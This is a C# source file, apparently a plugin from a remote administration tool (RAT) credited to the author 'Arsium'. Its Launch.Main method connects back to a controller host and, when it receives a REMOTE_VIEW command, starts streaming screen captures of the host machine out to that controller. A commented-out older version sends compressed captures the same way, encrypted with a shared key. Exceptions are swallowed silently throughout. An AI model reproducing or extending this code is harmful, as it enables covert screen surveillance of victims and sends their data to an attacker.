using Shared;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            try
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                Shared.PacketTypes.PacketType T = (Shared.PacketTypes.PacketType)Param[0];
                Data D = new Data();
                switch (T)
                {
                    case Shared.PacketTypes.PacketType.REMOTE_VIEW:
                        Socket SCam = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        IPEndPoint epCam = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                        SCam.Connect(epCam);
                        Functions.C = new Client(SCam);
                        Functions.hasToCapture = true;
                        Functions.SendCapture((int)Param[1], (int)Param[2], (int)Param[3], Param[4].ToString(), HWID, key, BaseIP);

                        /* 
                         * Old code , working but slower because each capture needs to get plugin from server !                   
                         byte[] captured = Shared.Compressor.QuickLZ.Compress(Functions.Capture((int)Param[1], (int)Param[2], (int)Param[3], Param[4].ToString()), 1);;
                         D.HWID = HWID;
                         D.Type = Shared.PacketTypes.PacketType.REMOTE_VIEW;
                         D.DataReturn = new object[] { captured, Screen.AllScreens[0].Bounds.Size };
                         D.IP_Origin = BaseIP;
                         await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));*/
                        break;

                }
                S.Close();
                S.Dispose();
            }
            catch { }
            finally
            {
                Shared.Utils.ClearMem();
            }
        }
    }
}
